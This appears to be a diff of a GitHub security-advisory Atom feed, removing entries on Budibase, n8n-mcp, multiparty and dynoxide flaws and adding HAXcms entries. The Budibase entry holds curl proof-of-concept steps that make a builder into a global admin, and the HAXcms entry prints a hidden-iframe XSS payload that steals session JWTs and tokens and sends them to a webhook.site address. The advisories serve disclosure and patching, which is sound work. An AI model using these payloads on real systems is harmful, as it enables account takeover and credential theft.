-<pre><code class="language-typescript">adminRoutes  // &lt;-- admin only
-  .post("/api/global/users/invite", buildInviteValidation(), controller.invite)
-  .post("/api/global/users/multi/invite", buildInviteMultipleValidation(), controller.inviteMultiple)
-</code></pre>
-<p><strong>Controller</strong> (<code>packages/worker/src/api/controllers/global/users.ts:601-630</code>):</p>
-<pre><code class="language-typescript">export const onboardUsers = async (ctx) =&gt; {
-  if (await isEmailConfigured()) {
-    await inviteMultiple(ctx)  // admin-only path (delegates to invite flow)
-    return
-  }
-
-  // No SMTP → directly create users with attacker-controlled roles
-  const users = ctx.request.body.map(invite =&gt; {
-    const password = generatePassword(12)
-    createdPasswords[invite.email] = password
-    return {
-      email: invite.email,
-      password,
-      forceResetPassword: true,
-      roles: invite.userInfo.apps || {},
-      admin: { global: !!invite.userInfo.admin },  // &lt;-- attacker-controlled
-      builder: invite.userInfo.builder,              // &lt;-- attacker-controlled
-      tenantId: tenancy.getTenantId(),
-    }
-  })
-
-  let resp = await userSdk.db.bulkCreate(users)
-  for (const user of resp.successful) {
-    user.password = createdPasswords[user.email]  // &lt;-- password returned!
-  }
-  ctx.body = { ...resp, created: true }
-}
-</code></pre>
-<p><strong>Middleware pass-through</strong> (<code>packages/backend-core/src/middleware/workspaceBuilderOrAdmin.ts:10-26</code>):</p>
-<p>In the worker context (<code>env.isWorker()</code> is <code>true</code>), when there is no <code>workspaceId</code> parameter in the request (which there isn't for the onboard endpoint), the middleware at line 19 checks <code>!workspaceId &amp;&amp; env.isWorker()</code> — this is <code>true</code>, so it falls through to line 21 which only checks <code>hasBuilderPermissions</code>. Any global builder passes.</p>
-<p><strong>Validation gap</strong> (<code>buildInviteMultipleValidation</code> at line 37-45): The Joi schema validates <code>userInfo</code> as <code>Joi.object().optional()</code> with no constraints on its contents, so <code>admin</code> and <code>builder</code> fields pass through.</p>
-<p><strong>No downstream check</strong>: <code>bulkCreate</code> and <code>buildUser</code> do not strip or validate admin/builder fields — they are written directly to the user document in CouchDB.</p>
-<h2 id="poc">PoC</h2>
-<p><strong>Prerequisites:</strong> A self-hosted Budibase instance (default: no SMTP configured) and a user account with builder-level access.</p>
-<p><strong>Step 1:</strong> Authenticate as a builder user and obtain the session cookie:</p>
-<pre><code class="language-bash"># Login as builder
-curl -s -c cookies.txt -X POST 'http://localhost:10000/api/global/auth/default/login' \
-  -H 'Content-Type: application/json' \
-  -d '{"username":"builder@example.com","password":"builderpassword"}'
-</code></pre>
-<p><strong>Step 2:</strong> Create a new global admin user via the onboard endpoint:</p>
-<pre><code class="language-bash">curl -s -X POST 'http://localhost:10000/api/global/users/onboard' \
-  -H 'Content-Type: application/json' \
-  -b cookies.txt \
-  -d '[{"email":"pwned-admin@attacker.com","userInfo":{"admin":{"global":true}}}]'
-</code></pre>
-<p><strong>Expected response</strong> (includes the generated password):</p>
-<pre><code class="language-json">{
-  "successful": [{"email":"pwned-admin@attacker.com","password":"&lt;generated-12-char-password&gt;","admin":{"global":true},...}],
-  "unsuccessful": [],
-  "created": true
-}
-</code></pre>
-<p><strong>Step 3:</strong> Login as the new admin:</p>
-<pre><code class="language-bash">curl -s -X POST 'http://localhost:10000/api/global/auth/default/login' \
-  -H 'Content-Type: application/json' \
-  -d '{"username":"pwned-admin@attacker.com","password":"&lt;password-from-step-2&gt;"}'
-</code></pre>
-<p>The attacker now has full global admin access.</p>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Privilege escalation:</strong> Any builder-level user can escalate to global admin on self-hosted Budibase instances without SMTP configured (the default deployment).</li>
-<li><strong>Full platform compromise:</strong> Global admin can access all apps, all data sources, manage all users, delete apps, and modify platform configuration.</li>
-<li><strong>Credential exposure:</strong> The generated password is returned in the HTTP response, giving the attacker immediate access to the new admin account.</li>
-<li><strong>Stealth:</strong> The created user appears as a legitimately onboarded user, making detection difficult without audit log review.</li>
-<li><strong>Wide applicability:</strong> Self-hosted Budibase instances commonly run without SMTP configuration, making this the default-exploitable path.</li>
-</ul>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p>Move the <code>onboardUsers</code> route from <code>builderOrAdminRoutes</code> to <code>adminRoutes</code> to match the authorization level of <code>invite</code> and <code>inviteMultiple</code>:</p>
-<pre><code class="language-diff">--- a/packages/worker/src/api/routes/global/users.ts
-+++ b/packages/worker/src/api/routes/global/users.ts
--builderOrAdminRoutes
-+adminRoutes
-   .post(
-     "/api/global/users/onboard",
-     buildInviteMultipleValidation(),
-     controller.onboardUsers
-   )
-</code></pre>
-<p>Additionally, the <code>onboardUsers</code> controller should validate that the caller has sufficient permissions to assign the requested role level. Even admin users should not be able to create users with roles exceeding their own. Consider adding explicit validation in the controller:</p>
-<pre><code class="language-typescript">// In onboardUsers, before bulkCreate:
-for (const invite of ctx.request.body) {
-  if (invite.userInfo.admin &amp;&amp; !ctx.user.admin?.global) {
-    ctx.throw(403, "Only admins can create admin users")
-  }
-}
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-c54j-xp92-wh28">https://github.com/Budibase/budibase/security/advisories/GHSA-c54j-xp92-wh28</a></li>
-<li><a href="https://github.com/Budibase/budibase/releases/tag/3.38.1">https://github.com/Budibase/budibase/releases/tag/3.38.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-c54j-xp92-wh28">https://github.com/advisories/GHSA-c54j-xp92-wh28</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-c54j-xp92-wh28</uri>
+            <uri>https://github.com/advisories/GHSA-hv85-774v-26fg</uri>
         </author>
         <category label="severity" term="HIGH"/>
-        <published>2026-05-18T17:42:24.000Z</published>
+        <published>2026-05-19T15:47:27.000Z</published>
     </entry>
     <entry>
-        <title type="html"><![CDATA[[n8n-mcp] n8n-MCP: Multi-tenant MCP requests fall back to process-level n8n credentials when tenant headers are absent or incomplete]]></title>
-        <id>https://github.com/advisories/GHSA-jxx9-px88-pj69</id>
-        <link href="https://github.com/advisories/GHSA-jxx9-px88-pj69"/>
-        <updated>2026-05-18T17:41:42.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>When <code>ENABLE_MULTI_TENANT=true</code>, the HTTP transport documents that the target n8n instance is selected per-request from <code>x-n8n-url</code> / <code>x-n8n-key</code> headers. Requests that omitted those headers — or supplied only one of them — silently fell back to the process-level <code>N8N_API_URL</code> / <code>N8N_API_KEY</code> credentials configured for the operator's own n8n instance. As a result, an authenticated MCP tenant could cause n8n management calls to execute against the operator's instance instead of its own.</p>
-<p>This affects HTTP-mode deployments of <code>n8n-mcp</code> that are run as a shared multi-tenant service. Single-tenant deployments (<code>ENABLE_MULTI_TENANT</code> unset or <code>false</code>) are not affected.</p>
-<h2 id="impact">Impact</h2>
-<p>An authenticated MCP tenant exploiting this path could read and write workflows, executions, data-table contents, and credential metadata on the operator's n8n instance. If the operator's n8n permits Code-node execution that reaches OS-level modules, the path could escalate to remote code execution inside the operator's n8n runtime. The process-level <code>N8N_API_KEY</code> is, in practice, a high-privilege key — Community Edition keys are unscoped by default, and even Enterprise scopes were configured for the operator's own needs and would carry over wholesale to a tenant who triggered the fallback.</p>
-<h2 id="patches">Patches</h2>
-<p>Fixed in <strong>n8n-mcp 2.51.2</strong>. The fix:</p>
-<ul>
-<li>Rejects header-less multi-tenant requests at the HTTP edge with HTTP 400 / JSON-RPC <code>-32602</code> before any handler runs.</li>
-<li>Refuses to construct an env-credential n8n API client when <code>ENABLE_MULTI_TENANT=true</code>.</li>
-<li>Closes secondary leak paths in trigger handlers and in the responses of <code>n8n_health_check</code>, <code>n8n_diagnostic</code>, <code>n8n_deploy_template</code>, and <code>n8n_audit_instance</code> so the operator's URL and env-key indicator are not surfaced to tenants.</li>
-</ul>
-<p>Single-tenant behavior is unchanged.</p>
-<h2 id="upgrade">Upgrade</h2>
-<pre><code class="language-bash"># NPM
-npx n8n-mcp@latest
-
-# Docker
-docker pull ghcr.io/czlonkowski/n8n-mcp:latest
-</code></pre>
-<h2 id="workarounds">Workarounds</h2>
-<p>If an immediate upgrade is not possible, any one of the following reduces or eliminates exposure:</p>
-<ul>
-<li><strong>Disable multi-tenant mode.</strong> Set <code>ENABLE_MULTI_TENANT=false</code> (or unset it) and run a separate n8n-mcp instance per tenant with that tenant's own <code>N8N_API_URL</code> / <code>N8N_API_KEY</code>. This removes the affected code path entirely.</li>
-<li><strong>Reject malformed requests at a proxy.</strong> Require both <code>x-n8n-url</code> and <code>x-n8n-key</code> headers on every request and return 400 if either is missing. Neutralizes the primary header-omission path but does not address the secondary response-shape disclosures, so this is a partial mitigation only.</li>
-<li><strong>Reduce the blast radius of the operator API key.</strong> If your n8n instance supports API key scoping (Enterprise, or a Community Edition build that exposes scopes), provision the operator's <code>N8N_API_KEY</code> with the minimum scopes required for the operator's own n8n-mcp functions. This does not close the boundary break but limits what a falling-back tenant can do.</li>
-</ul>
-<h2 id="credit">Credit</h2>
-<p>Reported by <a href="https://github.com/u-ktdi">@u-ktdi</a>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/czlonkowski/n8n-mcp/security/advisories/GHSA-jxx9-px88-pj69">https://github.com/czlonkowski/n8n-mcp/security/advisories/GHSA-jxx9-px88-pj69</a></li>
-<li><a href="https://github.com/czlonkowski/n8n-mcp/commit/853015d0897be7cf2d9d4726de195c938e4395ab">https://github.com/czlonkowski/n8n-mcp/commit/853015d0897be7cf2d9d4726de195c938e4395ab</a></li>
-<li><a href="https://github.com/czlonkowski/n8n-mcp/releases/tag/v2.51.2">https://github.com/czlonkowski/n8n-mcp/releases/tag/v2.51.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-jxx9-px88-pj69">https://github.com/advisories/GHSA-jxx9-px88-pj69</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jxx9-px88-pj69</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-18T17:41:42.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[multiparty] multiparty vulnerable to ReDoS via filename parsing]]></title>
-        <id>https://github.com/advisories/GHSA-65x3-rw7q-gx94</id>
-        <link href="https://github.com/advisories/GHSA-65x3-rw7q-gx94"/>
-        <updated>2026-05-18T17:40:10.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p><a href="mailto:multiparty@4.2.3">multiparty@4.2.3</a> and lower versions are vulnerable to denial of service via regular expression backtracking in the <code>Content-Disposition</code> filename parameter parser. A multipart upload with a long header value containing <code>!filename="1</code> repeated can cause regex matching to take seconds, blocking the event loop. Any service accepting multipart uploads via multiparty is affected.</p>
-<h3 id="patches">Patches</h3>
-<p>Users should upgrade to <a href="mailto:multiparty@4.3.0">multiparty@4.3.0</a> or higher.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>None. Limiting upload sizes at the proxy/gateway layer reduces but does not eliminate the attack surface, since a small ~8 KB header is sufficient to trigger the vulnerable backtracking.</p>
-<h3 id="resources">Resources</h3>
-<ul>
-<li><a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">OWASP: Regular expression Denial of Service (ReDoS)</a></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pillarjs/multiparty/security/advisories/GHSA-65x3-rw7q-gx94">https://github.com/pillarjs/multiparty/security/advisories/GHSA-65x3-rw7q-gx94</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8159">https://nvd.nist.gov/vuln/detail/CVE-2026-8159</a></li>
-<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
-<li><a href="https://github.com/pillarjs/multiparty/releases/tag/v4.3.0">https://github.com/pillarjs/multiparty/releases/tag/v4.3.0</a></li>
-<li><a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS</a></li>
-<li><a href="https://github.com/advisories/GHSA-65x3-rw7q-gx94">https://github.com/advisories/GHSA-65x3-rw7q-gx94</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-65x3-rw7q-gx94</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-18T17:40:10.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[multiparty] multiparty vulnerable to Denial of Service via Uncaught Exception in filename* parameter parsing]]></title>
-        <id>https://github.com/advisories/GHSA-xh3c-6gcq-g4rv</id>
-        <link href="https://github.com/advisories/GHSA-xh3c-6gcq-g4rv"/>
-        <updated>2026-05-18T17:35:26.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p><a href="mailto:multiparty@4.2.3">multiparty@4.2.3</a> and lower versions are vulnerable to denial of service via uncaught exception. By sending a <code>multipart/form-data</code> request with a <code>Content-Disposition: filename*=utf-8''</code> header containing a malformed percent-encoding (e.g., <code>%FF</code>, <code>%GG</code>), the parser invokes <code>decodeURI</code> on the value without try/catch. The resulting <code>URIError</code> propagates as an uncaught exception and crashes the process. Any service accepting multipart uploads via multiparty is affected.</p>
-<h3 id="patches">Patches</h3>
-<p>Users should upgrade to <a href="mailto:multiparty@4.3.0">multiparty@4.3.0</a> or higher.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>None.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pillarjs/multiparty/security/advisories/GHSA-xh3c-6gcq-g4rv">https://github.com/pillarjs/multiparty/security/advisories/GHSA-xh3c-6gcq-g4rv</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8162">https://nvd.nist.gov/vuln/detail/CVE-2026-8162</a></li>
-<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
-<li><a href="https://github.com/pillarjs/multiparty/releases/tag/v4.3.0">https://github.com/pillarjs/multiparty/releases/tag/v4.3.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-xh3c-6gcq-g4rv">https://github.com/advisories/GHSA-xh3c-6gcq-g4rv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xh3c-6gcq-g4rv</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-18T17:35:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[multiparty] multiparty: Denial of Service via Prototype Pollution leads to Uncaught Exception]]></title>
-        <id>https://github.com/advisories/GHSA-qxch-whhj-8956</id>
-        <link href="https://github.com/advisories/GHSA-qxch-whhj-8956"/>
-        <updated>2026-05-18T17:35:02.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p><a href="mailto:multiparty@4.2.3">multiparty@4.2.3</a> and lower versions are vulnerable to denial of service via uncaught exception. By sending a <code>multipart/form-data</code> request with a field name that collides with an inherited <code>Object.prototype</code> property (e.g., <code>__proto__</code>, <code>constructor</code>, <code>toString</code>), the parser invokes <code>.push()</code> on the inherited prototype value rather than an array, throwing a <code>TypeError</code> that propagates as an uncaught exception and crashes the process. Any service accepting multipart uploads via multiparty is affected.</p>
-<h3 id="patches">Patches</h3>
-<p>Users should upgrade to <a href="mailto:multiparty@4.3.0">multiparty@4.3.0</a> or higher.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>None.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pillarjs/multiparty/security/advisories/GHSA-qxch-whhj-8956">https://github.com/pillarjs/multiparty/security/advisories/GHSA-qxch-whhj-8956</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8161">https://nvd.nist.gov/vuln/detail/CVE-2026-8161</a></li>
-<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
-<li><a href="https://github.com/pillarjs/multiparty/releases/tag/v4.3.0">https://github.com/pillarjs/multiparty/releases/tag/v4.3.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-qxch-whhj-8956">https://github.com/advisories/GHSA-qxch-whhj-8956</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qxch-whhj-8956</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-18T17:35:01.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@tmlmobilidade/utils] @tmlmobilidade/utils has prototype pollution in its setValueAtPath]]></title>
-        <id>https://github.com/advisories/GHSA-cmxg-94mg-jq94</id>
-        <link href="https://github.com/advisories/GHSA-cmxg-94mg-jq94"/>
-        <updated>2026-05-18T17:07:04.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Prototype pollution vulnerability in @tmlmobilidade/utils for setValueAtPath().</p>
-<h3 id="patches">Patches</h3>
-<p>A fix is available in versions 20260509.0340.15 and up.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/tmlmobilidade/go/security/advisories/GHSA-cmxg-94mg-jq94">https://github.com/tmlmobilidade/go/security/advisories/GHSA-cmxg-94mg-jq94</a></li>
-<li><a href="https://github.com/tmlmobilidade/go/commit/b10505baa7ba0701f830a05f3007c0a6bdd00eb7">https://github.com/tmlmobilidade/go/commit/b10505baa7ba0701f830a05f3007c0a6bdd00eb7</a></li>
-<li><a href="https://github.com/tmlmobilidade/go/blob/prd/packages/utils/src/generic/value-at-path.ts">https://github.com/tmlmobilidade/go/blob/prd/packages/utils/src/generic/value-at-path.ts</a></li>
-<li><a href="https://github.com/advisories/GHSA-cmxg-94mg-jq94">https://github.com/advisories/GHSA-cmxg-94mg-jq94</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cmxg-94mg-jq94</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-18T17:07:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[dynoxide] dynoxide: DNS rebinding and cross-origin CSRF via MCP HTTP transport]]></title>
-        <id>https://github.com/advisories/GHSA-fvh2-gm75-j4j7</id>
-        <link href="https://github.com/advisories/GHSA-fvh2-gm75-j4j7"/>
-        <updated>2026-05-18T17:00:25.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>dynoxide's MCP HTTP transport was vulnerable to DNS rebinding via its transitive <code>rmcp</code> dependency, plus a related cross-origin CSRF gap. A malicious web page could make the user's browser send requests to a local <code>dynoxide mcp --http</code> or <code>dynoxide serve --mcp</code> server with a non-loopback <code>Host</code> header, which the server would then process. Affects 0.9.3 to 0.9.12. The stdio transport (<code>dynoxide mcp</code> without <code>--http</code>, which is the default) is not affected.</p>
-<h2 id="impact">Impact</h2>
-<p>If a user is running <code>dynoxide mcp --http</code> (or <code>dynoxide serve --mcp</code>) on their machine and then visits a malicious web page, the attacker's JavaScript can call any MCP tool exposed by the running dynoxide instance.</p>
-<p>Reachable tools include reads (<code>get_item</code>, <code>query</code>, <code>scan</code>, <code>batch_get_item</code>, <code>describe_table</code>, <code>list_tables</code>) and writes (<code>put_item</code>, <code>update_item</code>, <code>delete_item</code>, <code>create_table</code>, <code>batch_write_item</code>).</p>
-<p>Any data in tables that the local dynoxide instance has access to can be read, modified, or destroyed.</p>
-<h2 id="patches">Patches</h2>
-<p>dynoxide 0.9.13 closes both the named CVE and a related cross-origin CSRF gap:</p>
+        <title type="html"><![CDATA[[@haxtheweb/haxcms-nodejs] HAXcms: Mass Token Exfiltration and Cross-Tenant Hijack ]]></title>
+        <id>https://github.com/advisories/GHSA-x3x5-7h4h-gwxg</id>
+        <link href="https://github.com/advisories/GHSA-x3x5-7h4h-gwxg"/>
+        <updated>2026-05-19T14:47:04.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>An attack chain utilizing <strong>Stored XSS</strong> alongside dynamic token exposure in the <code>/system/api/connectionSettings</code> endpoint allows an authenticated attacker to perform a complete cross-tenant account takeover. The API dynamically leaks the active session's authentication tokens (including the <code>jwt</code>, <code>user_token</code>, <code>site_token</code>, and <code>appstore_token</code>) into a global JavaScript variable (<code>window.appSettings</code>). An attacker can exploit the XSS vulnerability to force a victim's browser to silently fetch their specific connection settings, extract the tokens, and exfiltrate them to an attacker-controlled webhook.</p>
+<h3 id="details">Details</h3>
+<p>In <code>Operations.php</code> (<code>connectionSettings()</code>), the system returns a Javascript object designed to bootstrap the frontend context. This object, <code>window.appSettings</code>, acts as a "skeleton key" because it aggregates all necessary operational tokens for the active session. </p>
+<p>While HAXcms correctly relies on the cryptographically signed JWT for backend authentication (preventing Direct Object Reference/IDOR attempts), the CMS fails to secure the tokens themselves. Specifically:</p>
 <ol>
-<li><p><strong>DNS rebinding (the named CVE).</strong> <code>rmcp</code> is upgraded from 1.1.1 to 1.6.0. rmcp 1.4+ ships a default Host-header allowlist (<code>["localhost", "127.0.0.1", "::1"]</code>) which rejects requests carrying any other Host header with a 403.</p>
-</li>
-<li><p><strong>Defence in depth.</strong> Explicit <code>allowed_hosts</code> and <code>allowed_origins</code> lists are now set on <code>StreamableHttpServerConfig</code> directly. The Host allowlist protects against a future rmcp default flip. The Origin allowlist closes a related cross-origin CSRF gap that the Host check alone does not address: a malicious page could <code>fetch</code> the loopback endpoint with <code>mode: 'no-cors'</code>, the Host header would match (it's the literal loopback address the browser is connecting to), but the Origin header would otherwise have been unchecked.</p>
-</li>
+<li><strong>The Vector</strong>: The system is vulnerable to Stored XSS (e.g., via injected <code>iframe</code> <code>srcdoc</code> or <code>&lt;video-player&gt;</code>).</li>
+<li><strong>The Exposure</strong>: Because the <code>connectionSettings</code> endpoint serves the tokens locally based on the active <code>PHPSESSID</code> cookie, any malicious script running in the browser context can intercept these keys.</li>
+<li><strong>The Chain</strong>: HAXcms isolates user environments by URL path (<code>/&lt;username&gt;/</code>). An attacker can use XSS to force the victim's browser to fetch their <em>target</em> username's specific settings via <code>fetch('/&lt;username&gt;/system/api/connectionSettings')</code>. Since the browser implicitly attaches the victim's session cookie, the server authenticates the request and returns the victim's valid JWT and tokens.</li>
 </ol>
-<p>Native MCP clients that don't send an Origin header (Claude Code, Cursor, the dynoxide CLI) are unaffected by the Origin check and continue to work.</p>
-<h2 id="workarounds">Workarounds</h2>
+<h3 id="poc">PoC</h3>
+<p><strong>1. Setup the Webhook Target</strong>
+Prepare an external webhook (e.g., <code>webhook.site</code>) to receive the stolen data.</p>
+<p><strong>2. Inject the "Kill Chain" Payload</strong>
+As an authenticated attacker (e.g., having edit access to any site), inject the following Javascript via the verified Stored XSS vectors (such as checking the HTML Source of a page and writing an <code>&lt;iframe&gt;</code>):</p>
+<pre><code class="language-html">&lt;iframe srcdoc="&lt;script&gt;
+    const targetUsername = 'bto108'; // Replace with target victim
+
+    fetch(`/${targetUsername}/system/api/connectionSettings`)
+      .then(res =&gt; res.text())
+      .then(data =&gt; {
+          const s = JSON.parse(data.substring(data.indexOf('{'), data.lastIndexOf('}') + 1));
+          
+          const uToken = new URL(document.location.origin + s.getUserDataPath).searchParams.get('user_token');
+          const sToken = new URL(document.location.origin + s.saveNodePath).searchParams.get('site_token');
+          
+          let aToken = 'N/A';
+          if (s.appStore &amp;&amp; s.appStore.params &amp;&amp; s.appStore.params.appstore_token) {
+              aToken = s.appStore.params.appstore_token;
+          }
+
+          // Exfiltrate via Image Request to bypass CORS
+          const payload = btoa(JSON.stringify({
+              target: targetUsername, 
+              jwt: s.jwt, 
+              user_token: uToken, 
+              site_token: sToken, 
+              appstore_token: aToken
+          }));
+          
+          new Image().src = `https://webhook.site/YOUR-WEBHOOK-ID?data=${payload}`;
+      });
+&lt;/script&gt;" style="display:none"&gt;&lt;/iframe&gt;
+</code></pre>
+<p><strong>3. Execution &amp; Verification</strong></p>
 <ul>
-<li>Upgrade to dynoxide 0.9.13.</li>
-<li>If upgrade is not immediately possible: do not run the MCP HTTP transport. Run <code>dynoxide mcp</code> (stdio, the default) instead of <code>dynoxide mcp --http</code>, and don't pass <code>--mcp</code> to <code>dynoxide serve</code>.</li>
+<li>When the victim (e.g., user <code>bto108</code>) views the compromised page, their browser automatically fires the <code>fetch</code> request, silently attaching their active session cookie.</li>
+<li>The server responds with their connection settings.</li>
+<li>The script parses their <code>jwt</code>, <code>user_token</code>, and other keys, encoding them in base64.</li>
+<li>The attacker receives the full JWT and token dump on their webhook.</li>
 </ul>
-<h2 id="resources">Resources</h2>
-<ul>
-<li>Upstream rmcp advisory: <a href="https://github.com/modelcontextprotocol/rust-sdk/security/advisories/GHSA-89vp-x53w-74fx">GHSA-89vp-x53w-74fx</a></li>
-<li>Upstream CVE: <a href="https://www.cve.org/CVERecord?id=CVE-2026-42559">CVE-2026-42559</a></li>
-<li>dynoxide release: <a href="https://github.com/nubo-db/dynoxide/releases/tag/v0.9.13">v0.9.13</a></li>
-<li>MCP transport security guidance: <a href="https://modelcontextprotocol.io/specification/2025-11-25/basic/transports#security-warning">https://modelcontextprotocol.io/specification/2025-11-25/basic/transports#security-warning</a></li>
-</ul>
-<h2 id="credits">Credits</h2>
-<p>Vulnerability identified via GitHub Dependabot alert on the transitive rmcp dependency.</p>
+<p><em>Screenshots confirming the data leakage and webhook capture:</em>
+<img alt="Connection Settings Exposure" src="https://github.com/user-attachments/assets/1aeee4ee-9475-4430-b4d3-3c6254075d11">
+<img alt="Secondary Settings Leak" src="https://github.com/user-attachments/assets/7179c1a5-2bfb-4ab6-ba1d-29bcb61a74d3">
+<img alt="Cross-tenant Exfiltration Console" src="https://github.com/user-attachments/assets/1abd21ec-fd45-4bd8-ba67-9c0bb19e6b08">
+<img alt="Webhook Payload Capture" src="https://github.com/user-attachments/assets/751e5cab-f4ad-4ab4-b276-86bf738f0434">
+<img alt="Stolen Data Result" src="https://github.com/user-attachments/assets/a41e15f7-1652-4351-8cc9-a423f6220158"></p>
+<h3 id="impact">Impact</h3>
+<p><strong>Critical Severity.</strong> 
+This attack completely compromises the primary defense mechanism of the CMS. By stealing the <code>jwt</code> and <code>user_token</code>, the attacker achieves <strong>total account hijacking</strong> without needing the victim's password. They can emulate the victim perfectly, bypassing standard interface restrictions to perform malicious administrative actions (creating/deleting sites, modifying user access, or uploading malicious content).</p>
+<p>The reliance on a global Javascript variable (<code>window.appSettings</code>) to store long-lived administrative security tokens creates a devastating chokepoint when combined with XSS.</p>
 <h3 id="references">References</h3>
 <ul>
-<li><a href="https://github.com/nubo-db/dynoxide/security/advisories/GHSA-fvh2-gm75-j4j7">https://github.com/nubo-db/dynoxide/security/advisories/GHSA-fvh2-gm75-j4j7</a></li>
-<li><a href="https://github.com/nubo-db/dynoxide/releases/tag/v0.9.13">https://github.com/nubo-db/dynoxide/releases/tag/v0.9.13</a></li>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0140.html">https://rustsec.org/advisories/RUSTSEC-2026-0140.html</a></li>
-<li><a href="https://github.com/advisories/GHSA-fvh2-gm75-j4j7">https://github.com/advisories/GHSA-fvh2-gm75-j4j7</a></li>
+<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-x3x5-7h4h-gwxg">https://github.com/haxtheweb/issues/security/advisories/GHSA-x3x5-7h4h-gwxg</a></li>
+<li><a href="https://github.com/advisories/GHSA-x3x5-7h4h-gwxg">https://github.com/advisories/GHSA-x3x5-7h4h-gwxg</a></li>
 </ul>
 ]]></content>
         <author>
             <name>GitHub</name>
             <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fvh2-gm75-j4j7</uri>
+            <uri>https://github.com/advisories/GHSA-x3x5-7h4h-gwxg</uri>
         </author>
         <category label="severity" term="HIGH"/>
-        <published>2026-05-18T17:00:25.000Z</published>
+        <published>2026-05-19T14:47:03.000Z</published>
     </entry>
     <entry>
-        <title type="html"><![CDATA[[@steipete/summarize] @steipete/summarize allows local attackers to read bearer tokens and API credentials stored in ~/.summarize/daemon.json]]></title>
-        <id>https://github.com/advisories/GHSA-qp7v-gjgg-4mj6</id>
-        <link href="https://github.com/advisories/GHSA-qp7v-gjgg-4mj6"/>
-        <updated>2026-05-18T16:47:46.000Z</updated>
-        <content type="html"><![CDATA[<p>Summarize versions through 0.14.1, fixed in commit 0cfb0fb, creates the daemon configuration directory and file with default filesystem permissions that may be world-readable on Unix-like systems, allowing local attackers to read bearer tokens and API credentials stored in ~/.summarize/daemon.json. A local attacker can exploit these permissive permissions to read the daemon bearer token and persisted provider credentials, enabling unauthorized access to the daemon or recovery of sensitive API keys.</p>
+        <title type="html"><![CDATA[[@haxtheweb/iframe-loader] Stored XSS via <iframe> in HAX CMS allows access to sensitive client-side data and account takeover]]></title>
+        <id>https://github.com/advisories/GHSA-jh3h-rpxg-fr36</id>
+        <link href="https://github.com/advisories/GHSA-jh3h-rpxg-fr36"/>
+        <updated>2026-05-19T14:46:48.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A stored cross-site scripting (XSS) vulnerability exists in HAX CMS due to improper sanitization of <code>&lt;iframe&gt;</code> elements.</p>
